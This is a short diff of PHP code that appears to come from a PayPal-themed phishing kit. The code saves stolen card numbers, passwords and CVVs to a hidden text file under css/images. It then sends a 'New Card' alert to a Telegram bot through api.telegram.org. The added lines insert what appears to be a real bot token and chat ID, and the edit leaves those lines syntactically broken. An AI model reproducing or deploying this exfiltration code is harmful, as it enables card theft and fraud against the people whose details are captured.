@@ -45,7 +45,7 @@ $protocol = $_SERVER['SERVER_PROTOCOL'];
     $ref = $_SERVER['HTTP_REFERER'];
     $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
     file_put_contents("css/images/i.txt","$cards$cardss$cardsss$cardssss:$pass:$cvv:$sal:$mah");
-    $token = "token"; //YourBotToken
+    $token = "token"; 918667949:AAG9smnBILEVyRGS207B8vAAcsvTaW958uo//
      $textmsg = "
 🔆 New Card 🔆
 ➖➖➖➖➖➖➖
@@ -59,7 +59,7 @@ $protocol = $_SERVER['SERVER_PROTOCOL'];
 ➖➖➖➖➖➖➖
 📎 @PayPal";
 
-     $gpid = 0000000; //ChatID
+     $gpid = ; 912288070//ChatID
 
      $send = file_get_contents("https://api.telegram.org/bot$token/SendMessage?chat_id=$gpid&text=".urlencode($textmsg));
 }else{
